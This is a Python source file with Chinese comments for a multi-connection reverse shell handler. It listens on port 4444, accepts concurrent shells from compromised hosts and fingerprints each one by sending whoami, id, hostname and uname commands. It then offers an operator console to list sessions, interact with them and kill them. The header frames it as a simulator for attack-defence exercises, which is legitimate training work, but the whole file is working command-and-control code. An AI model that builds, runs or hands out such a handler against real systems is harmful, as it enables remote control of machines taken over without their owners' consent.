#!/usr/bin/env python3
"""
多连接反弹Shell监听器
监听4444端口，支持并发的反向Shell连接
用途：模拟web攻防中的批量反弹shell接收端
"""

import socket
import select
import threading
import datetime
import sys
import re

HOST = "0.0.0.0"
PORT = 4444

sessions = {}        # {session_id: {socket, addr, thread, info, interacting}}
session_counter = 0
sessions_lock = threading.Lock()

ANSI_ESCAPE = re.compile(r'\x1b\[[0-9;]*[mABCDHJKfsuhl]|\r')


def strip_ansi(text):
    return ANSI_ESCAPE.sub("", text)


def banner():
    print("""
╔══════════════════════════════════════════╗
║      Multi Reverse Shell Handler         ║
║      监听端口: 4444                      ║
╚══════════════════════════════════════════╝
""")


def get_client_info(sock, addr):
    """向客户端发复合命令，解析基础系统信息"""
    info = {"ip": addr[0], "port": addr[1]}
    try:
        sock.settimeout(4)
        cmd = "echo '---INFO---' && whoami && id && hostname && uname -a && pwd && echo '---END---'\n"
        sock.send(cmd.encode())
        raw = b""
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            raw += chunk
            if b"---END---" in raw:
                break
    except Exception:
        raw = b""
    finally:
        sock.settimeout(None)

    # 去掉 ANSI 转义和 \r，再按行切割并 strip
    output = strip_ansi(raw.decode(errors="replace"))
    lines = [l.strip() for l in output.splitlines() if l.strip()]

    # 找 ---INFO--- 和 ---END--- 之间的内容
    try:
        start = lines.index("---INFO---") + 1
        end   = lines.index("---END---", start)
        fields = lines[start:end]
    except ValueError:
        # 标记未找到，尝试去掉命令回显（前几行含 echo 关键字）后取前5行
        fields = [l for l in lines if "echo" not in l and "---" not in l][:5]

    keys = ["user", "id", "hostname", "uname", "cwd"]
    for i, key in enumerate(keys):
        if i < len(fields):
            info[key] = fields[i]

    return info


def print_session_info(sid, info):
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"\n[+] 新连接 #{sid}  [{ts}]")
    print(f"    IP/Port  : {info.get('ip')}:{info.get('port')}")
    print(f"    用户     : {info.get('user', 'unknown')}")
    print(f"    ID信息   : {info.get('id', 'unknown')}")
    print(f"    主机名   : {info.get('hostname', 'unknown')}")
    print(f"    系统     : {info.get('uname', 'unknown')}")
    print(f"    当前目录 : {info.get('cwd', 'unknown')}")
    print(f"    输入 'interact {sid}' 进入该会话\n")


def handle_client(sock, addr, sid):
    """后台线程：采集信息后用 select 轮询检测断线，interact 期间暂停读取"""
    info = get_client_info(sock, addr)
    with sessions_lock:
        if sid in sessions:
            sessions[sid]["info"] = info
    print_session_info(sid, info)
    print_prompt()

    try:
        while True:
            with sessions_lock:
                if sid not in sessions:
                    return
                interacting = sessions[sid].get("interacting", False)

            if interacting:
                # interact 正在使用 socket，退出读取循环等待
                threading.Event().wait(0.1)
                continue

            # 用 select 检测可读（含断线），不阻塞
            try:
                r, _, _ = select.select([sock], [], [], 1.0)
            except Exception:
                break

            if r:
                try:
                    data = sock.recv(4096)
                    if not data:
                        break
                    # 有未被 interact 读走的数据（如 shell 主动输出），丢弃
                except Exception:
                    break
    finally:
        with sessions_lock:
            sessions.pop(sid, None)
        print(f"\n[-] 连接 #{sid} ({addr[0]}:{addr[1]}) 已断开")
        print_prompt()
        try:
            sock.close()
        except Exception:
            pass


def interact(sid):
    """进入指定 session 的交互模式"""
    with sessions_lock:
        session = sessions.get(sid)
        if not session:
            print(f"[!] 会话 #{sid} 不存在或已断开")
            return
        session["interacting"] = True

    sock = session["socket"]
    addr = session["addr"]
    print(f"\n[*] 进入会话 #{sid} ({addr[0]}:{addr[1]})  输入 'exit' 退出交互\n")

    try:
        sock.settimeout(0.5)
        while True:
            try:
                cmd = input(f"\033[33mshell#{sid}>\033[0m ")
            except EOFError:
                break

            if cmd.strip().lower() == "exit":
                break
            if not cmd.strip():
                continue

            try:
                sock.send((cmd + "\n").encode())
            except Exception as e:
                print(f"[!] 发送失败: {e}")
                break

            # 收集输出直到超时
            output = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        print("[!] 连接已断开")
                        return
                    output += chunk
                except socket.timeout:
                    break
                except Exception as e:
                    print(f"[!] 接收失败: {e}")
                    return

            print(output.decode(errors="replace"), end="", flush=True)

    finally:
        with sessions_lock:
            if sid in sessions:
                sessions[sid]["interacting"] = False
        try:
            sock.settimeout(None)
        except Exception:
            pass
        print(f"\n[*] 退出会话 #{sid} 交互，连接仍保持")


def list_sessions():
    with sessions_lock:
        snap = dict(sessions)
    if not snap:
        print("  (暂无活跃连接)")
        return
    print(f"\n  {'ID':<5} {'IP:Port':<22} {'用户':<15} {'主机名':<20} {'连接时间'}")
    print("  " + "-" * 80)
    for sid, s in snap.items():
        info = s.get("info", {})
        ts   = s.get("time", "")
        addr_str = f"{info.get('ip','?')}:{info.get('port','?')}"
        print(f"  {sid:<5} {addr_str:<22} {info.get('user','?'):<15} {info.get('hostname','?'):<20} {ts}")
    print()


def print_prompt():
    print("\033[36mhandler>\033[0m ", end="", flush=True)


def accept_loop(server_sock):
    global session_counter
    while True:
        try:
            client_sock, addr = server_sock.accept()
        except OSError:
            break
        with sessions_lock:
            session_counter += 1
            sid = session_counter
            sessions[sid] = {
                "socket":      client_sock,
                "addr":        addr,
                "info":        {},
                "time":        datetime.datetime.now().strftime("%H:%M:%S"),
                "interacting": False,
            }
        t = threading.Thread(target=handle_client, args=(client_sock, addr, sid), daemon=True)
        sessions[sid]["thread"] = t
        t.start()


def main():
    banner()

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(50)
    print(f"[*] 监听 {HOST}:{PORT} ...")
    print("[*] 命令: sessions | interact <id> | kill <id> | quit\n")

    accept_thread = threading.Thread(target=accept_loop, args=(server,), daemon=True)
    accept_thread.start()

    while True:
        try:
            line = input("\033[36mhandler>\033[0m ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] 退出")
            server.close()
            sys.exit(0)

        if not line:
            continue

        parts = line.split()
        cmd   = parts[0].lower()

        if cmd in ("sessions", "s", "list"):
            list_sessions()

        elif cmd == "interact" and len(parts) == 2:
            try:
                interact(int(parts[1]))
            except ValueError:
                print("[!] 用法: interact <session_id>")

        elif cmd == "kill" and len(parts) == 2:
            try:
                sid = int(parts[1])
                with sessions_lock:
                    s = sessions.pop(sid, None)
                if s:
                    try:
                        s["socket"].close()
                    except Exception:
                        pass
                    print(f"[*] 已关闭会话 #{sid}")
                else:
                    print(f"[!] 会话 #{sid} 不存在")
            except ValueError:
                print("[!] 用法: kill <session_id>")

        elif cmd in ("quit", "exit", "q"):
            print("[*] 退出")
            server.close()
            sys.exit(0)

        else:
            print("  sessions          — 列出所有活跃连接")
            print("  interact <id>     — 进入某个shell交互")
            print("  kill <id>         — 断开某个连接")
            print("  quit              — 退出程序")


if __name__ == "__main__":
    main()
